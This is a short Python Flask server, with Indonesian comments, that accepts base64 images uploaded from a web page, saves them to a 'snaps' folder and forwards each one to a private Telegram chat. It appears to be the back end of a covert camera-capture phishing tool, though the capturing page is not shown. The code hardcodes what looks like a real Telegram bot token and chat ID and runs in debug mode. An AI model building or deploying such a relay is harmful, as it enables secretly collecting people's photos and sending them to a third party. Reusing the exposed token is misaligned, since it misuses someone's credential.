
from flask import Flask, render_template, request, jsonify
import base64, os, datetime, requests

app = Flask(__name__)


BOT_TOKEN = "8346203423:AAFzTUsIV7CaOawLyQxVf7HKyrpLxKfakvk"
CHAT_ID = "1550260788"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        image_data = data.get('image')

        if not image_data:
            return jsonify({'success': False, 'error': 'Tidak ada gambar dikirim.'}), 400

        # Decode base64 ke bytes
        img_bytes = base64.b64decode(image_data)

        # Bikin folder kalo belum ada
        if not os.path.exists('snaps'):
            os.makedirs('snaps')

        # Nama file
        filename = f"snaps/foto_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(img_bytes)

        # Kirim ke Telegram
        files = {'photo': open(filename, 'rb')}
        caption = f"📸 Foto baru dikirim ke server!\nNama file: {os.path.basename(filename)}"
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        send = requests.post(telegram_url, data={'chat_id': CHAT_ID, 'caption': caption}, files=files)

        if send.status_code == 200:
            print(f"[+] Foto dikirim ke Telegram & disimpan: {filename}")
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Gagal kirim ke Telegram.'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(debug=True)
